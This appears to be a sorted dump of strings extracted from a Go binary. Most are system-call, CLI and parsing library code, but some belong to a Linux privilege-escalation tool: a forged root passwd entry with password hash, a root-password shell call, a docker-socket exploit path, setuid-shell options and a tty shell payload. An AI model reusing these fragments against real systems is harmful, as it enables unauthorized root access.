"return mmap2(addr, length, prot, flags, fd, page)"
"return mount(fd, afd, old, flag, aname)"
"return mount(source, target, fstype, flags, datap)"
"return mount(source, target, fstype, flags, nil)"
"return mountSetattr(dirfd, pathname, flags, attr, unsafe.Sizeof("
"return mount_LE(target, source, fstype, uint32(flags), int32(len(data)), data)"
"return msgs, nil"
"return n(f, name)"
"return n, ErrBadName"
"return n, ErrShortStat"
"return n, err"
"return n, errnoErr(e)"
"return n, errnoErr(e1)"
"return n, nil"
"return name == ""explorer.exe"""
"return name, usage"
"return net.Dial(""unix"", exp.sockPath)"
"return net.IPNet{}, err"
"return net.IPv4Mask(mask[12], mask[13], mask[14], mask[15])"
"return net.ParseIP(strings.TrimSpace(val)), nil"
"return newVersion(v, semverRegexp)"
"return newVersion(v, versionRegexp)"
"return newoffset, err"
"return newoffset, nil"
"return nil, "
"return nil, """", 0, e"
"return nil, """", 0, syscall.EINVAL"
"return nil, 0, EINVAL"
"return nil, 0, err"
"return nil, 0, syscall.EINVAL"
"return nil, EAFNOSUPPORT"
"return nil, EINVAL"
"return nil, EIO"
"return nil, ERROR_INTERNAL_ERROR"
"return nil, ERROR_NO_SUCH_DEVICE_INTERFACE"
"return nil, ErrBadStat"
"return nil, ErrShortStat"
"return nil, ErrUnsupported"
"return nil, ShellCompDirectiveNoFileComp"
"return nil, args, err"
"return nil, args, lastArg, nil"
"return nil, args, orgLastArg, "
"return nil, cobra.ShellCompDirectiveFilterDirs"
"return nil, cobra.ShellCompDirectiveNoFileComp"
"return nil, e"
"return nil, err"
"return nil, errno"
"return nil, errnoErr(EINVAL)"
"return nil, errors.New(""unimplemented property type"")"
"return nil, errorspkg.New(""unable to query buffer size from InitializeProcThreadAttributeList"")"
"return nil, fmt.Errorf("
"return nil, fmt.Errorf(""%s must be formatted as key=value"", pair)"
"return nil, fmt.Errorf(""Malformed constraint: %s"", v)"
"return nil, fmt.Errorf(""Malformed version: %s"", v)"
"return nil, fmt.Errorf(""Unsupported registry value type: %v"", dataType)"
"return nil, fmt.Errorf(""empty line"")"
"return nil, fmt.Errorf(""failed to find writable path"")"
"return nil, fmt.Errorf(""failed to list images"")"
"return nil, fmt.Errorf(""file already exists"")"
"return nil, fmt.Errorf(""invalid line: no bracketed section"")"
"return nil, fmt.Errorf(""invalid line: no command"")"
"return nil, fmt.Errorf(""invalid string being converted to Bytes: %s %s"", sval, err)"
"return nil, fmt.Errorf(""invalid string being converted to IP address: %s"", sval)"
"return nil, fmt.Errorf(""invalid string being converted to IPNet: %s"", sval)"
"return nil, fmt.Errorf(""nothing found"")"
"return nil, fmt.Errorf(""sysctl() returned a size of %d, which is not a multiple of %d"", n, SizeofKinfoProc)"
"return nil, fmt.Errorf(""terminal: GetState not implemented on %s/%s"", runtime.GOOS, runtime.GOARCH)"
"return nil, fmt.Errorf(""terminal: MakeRaw not implemented on %s/%s"", runtime.GOOS, runtime.GOARCH)"
"return nil, fmt.Errorf(""terminal: ReadPassword not implemented on %s/%s"", runtime.GOOS, runtime.GOARCH)"
"return nil, fmt.Errorf(""unable to parse %s as net.IPMask"", sval)"
"return nil, nil"
"return nil, nil, 0, err"
"return nil, nil, EINVAL"
"return nil, nil, ErrUnsupported"
"return nil, nil, err"
"return nil, nil, fmt.Errorf(""create failed: %w"", err)"
"return nil, nil, fmt.Errorf(""fcntl error: %w"", err)"
"return nil, nil, fmt.Errorf(""pipe read failed: %w"", err)"
"return nil, nil, fmt.Errorf(""pipe write failed: %w"", err)"
"return nil, ret"
"return nil, syscall.EAFNOSUPPORT"
"return nil, syscall.EINVAL"
"return nil, trimmedArgs, lastArg, nil"
"return nodes, nil"
"return nu.UUID[:], nil"
"return open(path, mode)"
"return open(path, mode, perm)"
"return openByHandleAt(mountFD, handle.fileHandle, flags)"
"return openat(AT_FDCWD, path, mode"
"return openat(dirfd, path, flags"
"return openat2(dirfd, path, how, SizeofOpenHow)"
"return origlen - len(buf), count, names"
"return origlen, count, names"
"return out, nil"
"return output.String(), nil"
"return p, nil"
"return p, t, nil"
"return params, setupDiGetDeviceInstallParams(deviceInfoSet, deviceInfoData, params)"
"return path == ""/dev/cons"" "
"return poll(nil, 0, timeout)"
"return pos, errnoErr(e)"
"return pos, nil"
"return ppoll(nil, 0, timeout, sigmask)"
"return prereleaseCheck(v, c) "
"return prev, nil"
"return ptrace(PTRACE_ATTACH, pid, 0, 0)"
"return ptrace(PTRACE_CONT, pid, 0, uintptr(signal))"
"return ptrace(PTRACE_CONT, pid, 1, signal)"
"return ptrace(PTRACE_DETACH, pid, 1, 0)"
"return ptrace(PTRACE_GETFPREGS, pid, uintptr(unsafe.Pointer(fpregsout)), 0)"
"return ptrace(PTRACE_GETFSBASE, pid, uintptr(unsafe.Pointer(fsbase)), 0)"
"return ptrace(PTRACE_GETREGS, pid, 0, uintptr(unsafe.Pointer(regsout)))"
"return ptrace(PTRACE_GETREGS, pid, uintptr(unsafe.Pointer(regsout)), 0)"
"return ptrace(PTRACE_GETREGSET, pid, uintptr(addr), uintptr(unsafe.Pointer("
"return ptrace(PTRACE_LWPEVENTS, pid, 0, enable)"
"return ptrace(PTRACE_LWPINFO, pid, info, int(unsafe.Sizeof(PtraceLwpInfoStruct{})))"
"return ptrace(PTRACE_SETOPTIONS, pid, 0, uintptr(options))"
"return ptrace(PTRACE_SETREGS, pid, 0, uintptr(unsafe.Pointer(regs)))"
"return ptrace(PTRACE_SETREGS, pid, uintptr(unsafe.Pointer(regs)), 0)"
"return ptrace(PTRACE_SETREGSET, pid, uintptr(addr), uintptr(unsafe.Pointer("
"return ptrace(PTRACE_SINGLESTEP, pid, 1, 0)"
"return ptrace(PTRACE_SYSCALL, pid, 0, uintptr(signal))"
"return ptrace1(request, pid, addr, data)"
"return ptracePeek(PTRACE_PEEKDATA, pid, addr, out)"
"return ptracePeek(PTRACE_PEEKTEXT, pid, addr, out)"
"return ptracePeek(PTRACE_PEEKUSR, pid, addr, out)"
"return ptracePoke(PTRACE_POKEDATA, PTRACE_PEEKDATA, pid, addr, data)"
"return ptracePoke(PTRACE_POKETEXT, PTRACE_PEEKTEXT, pid, addr, data)"
"return ptracePoke(PTRACE_POKEUSR, PTRACE_PEEKUSR, pid, addr, data)"
"return pty, err"
"return pty, tty, nil"
"return putmsg(fd, clp, datap, flags)"
"return r, 0"
"return r, 0, syscall.Errno(errno)"
"return r, b[l:]"
"return r, nil"
"return r, w, nil"
"return raw.Addr[:], nil"
"return readInt(buf, unsafe.Offsetof(Dirent{}.Fileno), unsafe.Sizeof(Dirent{}.Fileno))"
"return readInt(buf, unsafe.Offsetof(Dirent{}.Ino), unsafe.Sizeof(Dirent{}.Ino))"
"return readInt(buf, unsafe.Offsetof(Dirent{}.Namlen), unsafe.Sizeof(Dirent{}.Namlen))"
"return readInt(buf, unsafe.Offsetof(Dirent{}.Reclen), unsafe.Sizeof(Dirent{}.Reclen))"
"return readIntBE(b[off:], size), true"
"return readIntLE(b[off:], size), true"
"return reboot(LINUX_REBOOT_MAGIC1, LINUX_REBOOT_MAGIC2, cmd, """")"
"return reclen - uint64(unsafe.Offsetof(Dirent{}.Name)), true"
"return reflect.DeepEqual(c.Segments64(), v.Segments64())"
"return removexattr(link, attr, XATTR_NOFOLLOW)"
"return removexattr(path, attr, 0)"
"return resInfo, err"
"return restore(fd, oldState)"
"return result, nil"
"return ret, err"
"return ret, nil"
"return retCl, retData, flags, nil"
"return s, """""
"return s, e"
"return s, nil"
"return s.entries[index], true"
"return s[:nlPos], s[nlPos"
"return s[:w], s[w"
"return sa, nil"
"return schedAffinity(SYS_SCHED_GETAFFINITY, pid, set)"
"return schedAffinity(SYS_SCHED_SETAFFINITY, pid, set)"
"return sec, nsec"
"return sendfile(outfd, infd, offset, count)"
"return sendmsgN(fd, p, oob, ptr, salen, flags)"
"return sendto(fd, p, flags, ptr, n)"
"return sendto(fd, p, int32(flags), ptr, l)"
"return sendto(s, buf, flags, nil, 0)"
"return setConsoleCursorPosition(console, "
"return setSecurityDescriptorControl(sd, controlBitsOfInterest, controlBitsToSet)"
"return setSecurityDescriptorDacl(absoluteSD, present, dacl, defaulted)"
"return setSecurityDescriptorGroup(absoluteSD, group, defaulted)"
"return setSecurityDescriptorOwner(absoluteSD, owner, defaulted)"
"return setSecurityDescriptorSacl(absoluteSD, present, sacl, defaulted)"
"return setTimespec(sec, nsec)"
"return setTimeval(sec, usec)"
"return setgroups(0, nil)"
"return setgroups(len(a), "
"return setrlimit(resource, "
"return setrlimit(resource, rlim)"
"return setsockopt(fd, level, opt, p, uintptr(len(filter)"
"return setsockopt(fd, level, opt, p, uintptr(len(s)))"
"return setsockopt(fd, level, opt, unsafe.Pointer("
"return setsockopt(fd, level, opt, unsafe.Pointer(filter), SizeofICMPv6Filter)"
"return setsockopt(fd, level, opt, unsafe.Pointer(fprog), unsafe.Sizeof("
"return setsockopt(fd, level, opt, unsafe.Pointer(l), SizeofLinger)"
"return setsockopt(fd, level, opt, unsafe.Pointer(mreq), SizeofIPMreq)"
"return setsockopt(fd, level, opt, unsafe.Pointer(mreq), SizeofIPv6Mreq)"
"return setsockopt(fd, level, opt, unsafe.Pointer(mreq), unsafe.Sizeof("
"return setsockopt(fd, level, opt, unsafe.Pointer(tp), unsafe.Sizeof("
"return setsockopt(fd, level, opt, unsafe.Pointer(tv), unsafe.Sizeof("
"return setupDiCreateDeviceInfoListEx(classGUID, hwndParent, machineNameUTF16, 0)"
"return setupDiGetClassDevsEx(classGUID, enumeratorUTF16, hwndParent, flags, deviceInfoSet, machineNameUTF16, 0)"
"return setupDiSetDeviceRegistryProperty(deviceInfoSet, deviceInfoData, property, "
"return setupUninstallOEMInf(infFileName16, flags, 0)"
"return setxattr(link, attr, xattrPointer(data), len(data), 0, flags"
"return setxattr(path, attr, xattrPointer(data), len(data), 0, flags)"
"return shell.WithPassword(""root"", ""traitor"", log)"
"return shmctl(id, cmd, desc)"
"return shmget(key, size, flag)"
"return shutdown(fd, int32(how))"
"return sid, UTF16ToString(db), accType, nil"
"return sid, nil"
"return sid2, nil"
"return signalfd(fd, sigmask, _C__NSIG/8, flags)"
"return socket(int32(domain), int32(typ), int32(proto))"
"return stat(path, edir)"
"return stat(path, statptr)"
"return statfs_freebsd12(path, st)"
"return strconv.ParseFloat(sval, 64)"
"return strconv.ParseFloat(val, 64)"
"return strconv.ParseInt(sval, 0, 64)"
"return strconv.ParseInt(val, 0, 64)"
"return string(b[0:i]), nil"
"return string(b[:n]), b[n:], true"
"return string(buf[0 : n-1]), nil"
"return string(buf[0:n]), nil"
"return string(buf[:i]), nil"
"return string(buf[:n]), nil"
"return string(buf[:vallen-1]), nil"
"return string(buffer[:length-1]), nil"
"return string(n[:i]), nil"
"return string(name[:i]), nil"
"return string(utf16.Decode(b[0:n])), nil"
"return strings.Join(append([]string{c.Name()}, c.Aliases...), "", "")"
"return strings.Join(csStr, "","")"
"return strings.Join(directives, "", "")"
"return strings.Replace(s, """
"return strings.Replace(s, ""ptm"", ""pts"", -1), nil"
"return strings.ReplaceAll(activeHelpEnvVar, ""-"", ""_"")"
"return strings.TrimRightFunc(s, unicode.IsSpace)"
"return strings.TrimSuffix(b.String(), """
"return stripUnknownFlagValue(a), nil"
"return sval, nil"
"return syncFileRange2(fd, flags, off, n)"
"return syscall(trap, a1, a2, a3, a4, a5, a6, a7, a8, a9)"
"return syscall.ErrorString(""bad arg in system call"")"
"return syscall.ErrorString(""invalid wait message"")"
"return syscall.Exec(argv0, argv, envv)"
"return syscall.RawSyscall(trap, a1, a2, a3)"
"return syscall.RawSyscall6(trap, a1, a2, a3, a4, a5, a6)"
"return syscall.Setenv(key, value)"
"return syscall.Syscall(p.Addr(), uintptr(len(a)), 0, 0, 0)"
"return syscall.Syscall(p.Addr(), uintptr(len(a)), a[0], 0, 0)"
"return syscall.Syscall(p.Addr(), uintptr(len(a)), a[0], a[1], 0)"
"return syscall.Syscall(p.Addr(), uintptr(len(a)), a[0], a[1], a[2])"
"return syscall.Syscall(trap, a1, a2, a3)"
"return syscall.Syscall12(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9], 0, 0)"
"return syscall.Syscall12(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9], a[10], 0)"
"return syscall.Syscall12(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9], a[10], a[11])"
"return syscall.Syscall15(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9], a[10], a[11], a[12], 0, 0)"
"return syscall.Syscall15(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9], a[10], a[11], a[12], a[13], 0)"
"return syscall.Syscall15(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8], a[9], a[10], a[11], a[12], a[13], a[14])"
"return syscall.Syscall6(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], 0, 0)"
"return syscall.Syscall6(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], 0)"
"return syscall.Syscall6(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], a[5])"
"return syscall.Syscall6(trap, a1, a2, a3, a4, a5, a6)"
"return syscall.Syscall9(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], a[5], a[6], 0, 0)"
"return syscall.Syscall9(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], 0)"
"return syscall.Syscall9(p.Addr(), uintptr(len(a)), a[0], a[1], a[2], a[3], a[4], a[5], a[6], a[7], a[8])"
"return sysctlMib[i].ctloid, nil"
"return t.Execute(w, data)"
"return term.NewTerminal(c, prompt)"
"return term.Restore(fd, oldState)"
"return token, err"
"return true, nil"
"return ts, nil"
"return uint(t), nil"
"return uint(v), nil"
"return uint16(v), nil"
"return uint32(__major(NEWDEV, dev))"
"return uint32(__minor(NEWDEV, dev))"
"return uint32(v), nil"
"return uint64(minor(status.Rdev)), nil"
"return uint64(v), nil"
"return uint8(b[0]), b[1:]"
"return uint8(v), nil"
"return uintptr(offs), uintptr(uint64(offs) >> SizeofLong)"
"return uintptr(v), nil"
"return unix.IoctlSetTermios(fd, ioctlWriteTermios, "
"return unix.Read(int(r), buf)"
"return unmount(name, mtm)"
"return updateProcThreadAttribute(al.data, 0, attribute, value, size, nil, nil)"
"return user, nil"
"return utf8.RuneError, b"
"return utf8.RuneError, nil"
"return utimensat(AT_FDCWD, path, ("
"return utimensat(AT_FDCWD, path, nil, 0)"
"return utimensat(dirfd, path, ("
"return utimensat(dirfd, path, nil, 0)"
"return utimensat(dirfd, path, nil, flags)"
"return utimes(path, ("
"return utimes(path, nil)"
"return uuid, err"
"return uuid, errors.New(""invalid UUID format"")"
"return uuid, fmt.Errorf(""invalid urn prefix: %q"", b[:9])"
"return uuid, fmt.Errorf(""invalid urn prefix: %q"", s[:9])"
"return uuid, invalidLengthError{len(b)}"
"return uuid, invalidLengthError{len(s)}"
"return uuid, nil"
"return uuid.String(), nil"
"return uuid[:], nil"
"return v.Exploit(ctx, s, log, payloads.Default)"
"return v.Exploit(ctx, s, log, payloads.Defer)"
"return v.exploitWithImage(imageName, true, payload, log)"
"return val.([]bool), nil"
"return val.([]byte), nil"
"return val.([]float32), nil"
"return val.([]float64), nil"
"return val.([]int), nil"
"return val.([]int32), nil"
"return val.([]int64), nil"
"return val.([]net.IP), nil"
"return val.([]string), nil"
"return val.([]time.Duration), nil"
"return val.([]uint), nil"
"return val.(bool), nil"
"return val.(float32), nil"
"return val.(float64), nil"
"return val.(int), nil"
"return val.(int16), nil"
"return val.(int32), nil"
"return val.(int64), nil"
"return val.(int8), nil"
"return val.(map[string]int), nil"
"return val.(map[string]int64), nil"
"return val.(map[string]string), nil"
"return val.(net.IP), nil"
"return val.(net.IPMask), nil"
"return val.(net.IPNet), nil"
"return val.(string), nil"
"return val.(time.Duration), nil"
"return val.(uint), nil"
"return val.(uint16), nil"
"return val.(uint32), nil"
"return val.(uint64), nil"
"return val.(uint8), nil"
"return value, err"
"return waitForMultipleObjects(uint32(len(handles)), uintptr(unsafe.Pointer(handlePtr)), waitAll, waitMilliseconds)"
"return winHeapSD.copySelfRelativeSecurityDescriptor(), nil"
"return windows.SetConsoleMode(windows.Handle(fd), state.mode)"
"return wpid, err"
"return wpid, nil"
"return writeWithCRLF(t.c, buf)"
"return wstat(path, edir)"
"return x, err"
"reverse:   """
"rgid, gid_t "
"right := make(Constraints, len(c))"
"right, _ = strconv.ParseInt(bv.String(), 10, 64)"
"rlo, e := SetFilePointer(fd, lo, "
"rootCmd.MarkFlagRequired(""region"")"
"rootCmd.MarkFlagsMutuallyExclusive(""json"", ""yaml"")"
"rootCmd.MarkFlagsRequiredTogether(""username"", ""password"")"
"rootCmd.MarkPersistentFlagRequired(""region"")"
"rootCmd.PersistentFlags().Bool(""viper"", true, ""use Viper for configuration"")"
"rootCmd.PersistentFlags().StringP(""author"", ""a"", ""YOUR NAME"", ""author name for copyright attribution"")"
"rootLine := ""root:$1$traitor$ELjiH/IyoHuVv5Hxiqam21:0:0::/root:/bin/sh"
"rpid, err := wait4(int32(pid), "
"rqtp, struct timespec "
"rsa, "
"rsa, l, err := to.sockaddr()"
"ruid, uid_t "
"run=""cat"""
"run=""sh"""
"runAnyExploit, ""any"", ""a"", runAnyExploit, ""Attempt to exploit a vulnerability as soon as it is detected. Provides a shell where possible."")"
"runtime.GOARCH == ""mips64"" "
"runtime.RaceReadRange(addr, len)"
"runtime.RaceWriteRange(addr, len)"
"s := ""/dev/"" "
"s := fmt.Sprintf(""%d.%d.%d.%d"", m[0], m[1], m[2], m[3])"
"s := strings.IndexByte(fullattr, '.')"
"s, connectExFunc.err = Socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)"
"s, sendRecvMsgFunc.err = Socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)"
"s.Atim = Timespec{int64(st.Atime), int64(st.Atime_nsec)}"
"s.Ctim = Timespec{int64(st.Ctime), int64(st.Ctime_nsec)}"
"s.Hostname, _ = os.Hostname()"
"s.Mtim = Timespec{int64(st.Mtime), int64(st.Mtime_nsec)}"
"s.SudoEntries = append(s.SudoEntries, item)"
"s.entries = make([]string, defaultNumEntries)"
"s.value, i)"
"s.value, out...)"
"s.value, v...)"
"s.value, val)"
"s16, err := UTF16PtrFromString(s)"
"s8, err := BytePtrFromString(s)"
"sa, err = anyToSockaddr(0, "
"sa, err = anyToSockaddr(fd, "
"sa.raw), SizeofSockaddrALG, nil"
"sa.raw), SizeofSockaddrCAN, nil"
"sa.raw), SizeofSockaddrCtl, nil"
"sa.raw), SizeofSockaddrDatalink, nil"
"sa.raw), SizeofSockaddrHCI, nil"
"sa.raw), SizeofSockaddrIUCV, nil"
"sa.raw), SizeofSockaddrInet4, nil"
"sa.raw), SizeofSockaddrInet6, nil"
"sa.raw), SizeofSockaddrL2, nil"
"sa.raw), SizeofSockaddrL2TPIP, nil"
"sa.raw), SizeofSockaddrL2TPIP6, nil"
"sa.raw), SizeofSockaddrLinklayer, nil"
"sa.raw), SizeofSockaddrNFC, nil"
"sa.raw), SizeofSockaddrNFCLLCP, nil"
"sa.raw), SizeofSockaddrNetlink, nil"
"sa.raw), SizeofSockaddrPPPoX, nil"
"sa.raw), SizeofSockaddrRFCOMM, nil"
"sa.raw), SizeofSockaddrTIPC, nil"
"sa.raw), SizeofSockaddrVM, nil"
"sa.raw), SizeofSockaddrXDP, nil"
"sa.raw), _Socklen(sa.raw.Len), nil"
"sa.raw), int32(unsafe.Sizeof(sa.raw)), nil"
"sa.raw), sl, nil"
"sacl, "
"saclSize, nil, "
"saclSize, owner, "
"samples, size_t size, u_long offset, u_int scale)"
"sb, int flags)"
"sbytes, int flags)"
"scratch)), 0, 0)"
"sddl, nil)"
"sections = append(sections, ("
"sed ""s/"
"seek(SB),NOSPLIT,$0-28"
"seek(SB),NOSPLIT,$0-36"
"seek(SB),NOSPLIT,$0-56"
"segmentSlice := make([]int, len(v.segments))"
"segments := make([]int64, len(segmentsStr))"
"segments = append(segments, 0)"
"segments = append(segments, n)"
"segments: segments,"
"segmentsOnly := fmt.Sprintf(""%d.%d.%d"", segments[0], segments[1], segments[2])"
"segmentsStr := strings.Split(matches[1], ""."")"
"select(int nd, fd_set "
"selfInt, err := strconv.ParseInt(preSelf, 10, 64)"
"selfPreReleaseMeta := strings.Split(v, ""."")"
"semget(key_t key, int nsems, int semflg)"
"semop(int semid, struct sembuf "
"semverRegexp = regexp.MustCompile("""
"sendRecvMsgFunc.err = WSAIoctl(s,"
"sendRecvMsgFunc.recvAddr)),"
"sendRecvMsgFunc.sendAddr)),"
"sendfile(infd int, outfd int, offset int64, len "
"sendfile(outfd int, infd int, offset "
"sendmmsg(int s, struct mmsghdr "
"sendmsg(int s, const struct msghdr "
"sendmsg(s int, msg "
"sendto(int s, const void "
"sendto(s Handle, buf []byte, flags int32, to unsafe.Pointer, tolen int32) (err error) [failretval==socket_error] = ws2_32.sendto"
"sendto(s int, buf []byte, flags int, to unsafe.Pointer, addrlen _Socklen) (err error) = SYS___SENDTO_A"
"sendto(s int, buf []byte, flags int, to unsafe.Pointer, addrlen _Socklen) (err error) = libsocket.__xnet_sendto"
"sendto(s int, buf []byte, flags int, to unsafe.Pointer, addrlen _Socklen) (err error)"
"set = append(set, flagname)"
"set)), uintptr(unsafe.Pointer(set)))"
"set, int "
"set, siginfo_t "
"set, sigset_t "
"set,siginfo_t "
"setConsoleCursorPosition(console Handle, position uint32) (err error) = kernel32.SetConsoleCursorPosition"
"setEntriesInAcl(countExplicitEntries uint32, explicitEntries "
"setNodeInterface("""")"
"setSecurityDescriptorRMControl(sd, "
"setfsgid(gid int) (prev int, err error) = SYS_SETFSGID32"
"setfsgid(gid int) (prev int, err error)"
"setfsuid(uid int) (prev int, err error) = SYS_SETFSUID32"
"setfsuid(uid int) (prev int, err error)"
"setgroups(int gidsetsize, const gid_t "
"setgroups(n int, list "
"setgroups(ngid int, gid "
"setitimer(int which, const struct itimerval "
"setitimer(which int, newValue "
"setpgid(pid_t pid, pid_t pgid)"
"setpriority(int which, id_t who, int prio)"
"setregid(gid_t rgid, gid_t egid)"
"setreuid(uid_t ruid, uid_t euid)"
"setrlimit(int which, const struct rlimit "
"setrlimit(resource int, rlim "
"setsockopt(int s, int level, int name, const void "
"setsockopt(s int, level int, name int, val unsafe.Pointer, vallen uintptr) (err error) = libsocket.setsockopt"
"setsockopt(s int, level int, name int, val unsafe.Pointer, vallen uintptr) (err error)"
"setuidShell, ""shell"", ""s"", setuidShell, ""Path to shell to execute, e.g. /bin/bash."")"
"setuidShellCmd, ""cmd"", ""c"", setuidShellCmd, ""Shell command to execute - leave blank to be dropped in interactive shell."")"
"setuidShellSrcPath, err := os.Executable()"
"setupDiCreateDeviceInfo(deviceInfoSet DevInfo, DeviceName "
"setupDiEnumDeviceInfo(deviceInfoSet DevInfo, memberIndex uint32, deviceInfoData "
"setupDiEnumDriverInfo(deviceInfoSet DevInfo, deviceInfoData "
"setupDiGetDeviceInfoListDetail(deviceInfoSet DevInfo, deviceInfoSetDetailData "
"setupDiGetDeviceInstallParams(deviceInfoSet DevInfo, deviceInfoData "
"setupDiGetDeviceInstanceId(deviceInfoSet DevInfo, deviceInfoData "
"setupDiGetDeviceProperty(deviceInfoSet DevInfo, deviceInfoData "
"setupDiGetDeviceRegistryProperty(deviceInfoSet DevInfo, deviceInfoData "
"setupDiGetDriverInfoDetail(deviceInfoSet DevInfo, deviceInfoData "
"setupDiGetSelectedDevice(deviceInfoSet DevInfo, deviceInfoData "
"setupDiGetSelectedDriver(deviceInfoSet DevInfo, deviceInfoData "
"setupDiSetDeviceRegistryProperty(deviceInfoSet DevInfo, deviceInfoData "
"setxattr(path string, attr string, data "
"sh _ echo sh <$(tty) >$(tty) 2>$(tty)')""},"
"sh$"", ""/bin""},"
"shellCmd.Args = append(shellCmd.Args, ""-c"", setuidShellCmd)"
"shmaddr, int shmflg)"
"shmat(id int, addr uintptr, flag int) (ret uintptr, err error)"
"shmat(int shmid, const void "
"shmctl(id int, cmd int, buf "
"shmctl(int shmid, int cmd, struct shmid_ds "
"shmget(key int, size int, flag int) (id int, err error)"
"shmget(key_t key, size_t size, int shmflg)"
"shortDesc := ""Generate the autocompletion script for %s"""
"shorthands, a, err = f.parseSingleShortArg(shorthands, args, fn)"
"shutdown(int s, int how)"
"shutdown(s Handle, how int32) (err error) [failretval==socket_error] = ws2_32.shutdown"
"si:       len(segmentsStr),"
"sidx := strings.Index(line, """
"signal numbers, and constants. Generated by "
"signal.Notify(ch, syscall.SIGWINCH)"
"signalNameMap = make(map[string]syscall.Signal, len(signalList))"
"signalfd(fd int, sigmask "
"sigqueueinfo(pid_t pid, const siginfo_t "
"sinfo, int "
"sinfo, int flags)"
"size, buf := gbit16(b)"
"size, err := GetsizeFull(pty)"
"size, err := SizeofResource(module, resInfo)"
"size, err := unix.FcntlInt(w.Fd(), syscall.F_GETPIPE_SZ, -1)"
"size_t len, int behav, off_t value)"
"skip, err := Seek(fd, 0, 1 /"
"skipExploits, ""skip"", ""k"", skipExploits, ""Exploit(s) to skip - specify multiple times to skip multiple exploits."")"
"sname, err := ptsname(p)"
"sname, os.O_RDWR, 0)"
"snapshot, _, e1 := CreateToolhelp32Snapshot.Call(th32cs_snapprocess, uintptr(0))"
"snapshot, err := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)"
"snapshot, err := syscall.CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)"
"soFilename := fmt.Sprintf(""sharedobject_%s_%s.go"", desc, platform.goarch)"
"soPath := filepath.Join(outputDir, soFilename)"
"sockPath: ""/var/run/docker.sock"","
"sockType, err = GetsockoptInt(fd, SOL_SOCKET, SO_TYPE)"
"sockaddr() (ptr unsafe.Pointer, len _Socklen, err error) // lowercase"
"sockaddr() (ptr unsafe.Pointer, len int32, err error) // lowercase"
"socket(af int32, typ int32, protocol int32) (handle Handle, err error) [failretval==InvalidHandle] = ws2_32.socket"
"socket(domain int, typ int, proto int) (fd int, err error) = libsocket.__xnet_socket"
"socket(domain int, typ int, proto int) (fd int, err error)"
"socket(int domain, int type, int protocol)"
"socketcall(SB),NOSPLIT,$0-36"
"socketpair(domain int, typ int, flags int, fd "
"socketpair(domain int, typ int, proto int, fd "
"socketpair(int domain, int type, int protocol, int "
"sops, size_t nsops)"
"sops, u_int nsops)"
"sourcePath := filepath.Join(os.TempDir(), ""traitor.c"")"
"spacing := strings.Repeat("" "", maxlen-sidx)"
"spliced, err := syscall.Splice(int(target.Fd()), "
"split := strings.SplitN(name, ""="", 2)"
"srcDirent))[:], old[srcPos:])"
"srcPath := filepath.Join(os.TempDir(), ""traitor.c"")"
"ss := strings.Split(val, "","")"
"ss = append(ss, strings.Trim(val, "
"ss, err := r.Read()"
"ss, err = r.Read()"
"ss, stack_t "
"st, flags"
"stRingBuffer) NthPreviousEntry(n int) (value string, ok bool) {"
"startTime         [8]byte  // uint64, changed to prevent padding from being inserted"
"stat(path string, edir []byte) (n int, err error)"
"stat(path string, st "
"stat(path string, stat "
"stat(path string, statLE "
"stat(path string, statptr "
"stat, err := os.Stat(path)"
"stat.Dev = Mkdev(r.Dev_major, r.Dev_minor)"
"stat.Rdev = Mkdev(r.Rdev_major, r.Rdev_minor)"
"stat_freebsd11_t, flags int) (err error) {"
"stat_freebsd11_t, flags int) (err error)"
"stat_t, flags int) (err error) = SYS_NEWFSTATAT"
"stat_t, flags int) (err error) {"
"state.HasPassword,"
"state.State, l logger.Logger) bool"
"state.State, l logger.Logger) error"
"state.State, l logger.Logger, payload payloads.Payload) error"
"state.State, log logger.Logger) bool {"
"state.State, log logger.Logger) error {"
"state.State, log logger.Logger, payload payloads.Payload) error {"
"statfs(path string, stat "
"statfs_freebsd12(path string, stat "
"status, int options, struct __wrusage "
"status, int options, struct rusage "
"status, options)"
"status, options, rusage)"
"stmp, e := ExtattrListFd(fd, nsid, uintptr(d), destsiz)"
"stmp, e := ExtattrListFile(file, nsid, uintptr(d), destsiz)"
"stmp, e := ExtattrListLink(link, nsid, uintptr(d), destsiz)"
"store, int count)"
"str := strconv.FormatInt(s, 10)"
"str, _ := writeAsCSV("
"str, err := UTF16FromString(description)"
"str, err := UTF16FromString(driverPath)"
"str, err := UTF16FromString(mfgName)"
"str, err := UTF16FromString(providerName)"
"str, err := UTF16FromString(remoteMachineName)"
"str16, err := UTF16FromString(str)"
"str16, err := syscall.UTF16PtrFromString(str)"
"str[0], int32(len(str)))"
"strbuf, dataptr "
"strbuf, flags "
"strbuf, flags int) (err error) {"
"strbuf, flags int) (err error)"
"strcpy(buf, strerror(e))"
"strcpy(buf, strsignal(e))"
"string, error) {"
"string, name string, value string, usage string) {"
"string, name, shorthand string, value string, usage string) {"
"stringSliceValue, "
"strings.Contains(flag.Value.Type(), ""Array"") {"
"strings.Contains(flag.Value.Type(), ""Slice"") "
"strings.Join(ops, """
"strings.Repeat("" "", i), -1)"
"struct ret gccgoRealSyscall(uintptr_t trap, uintptr_t a1, uintptr_t a2, uintptr_t a3, uintptr_t a4, uintptr_t a5, uintptr_t a6, uintptr_t a7, uintptr_t a8, uintptr_t a9)"
"subCmd, _, err := c.Find(args)"
"subject line, so it is easy to find."
"sublicense, and/or sell copies of the Software, and to"
"suffix, len(prefix), key)"
"suggestByPrefix := strings.HasPrefix(strings.ToLower(cmd.Name()), strings.ToLower(typedName))"
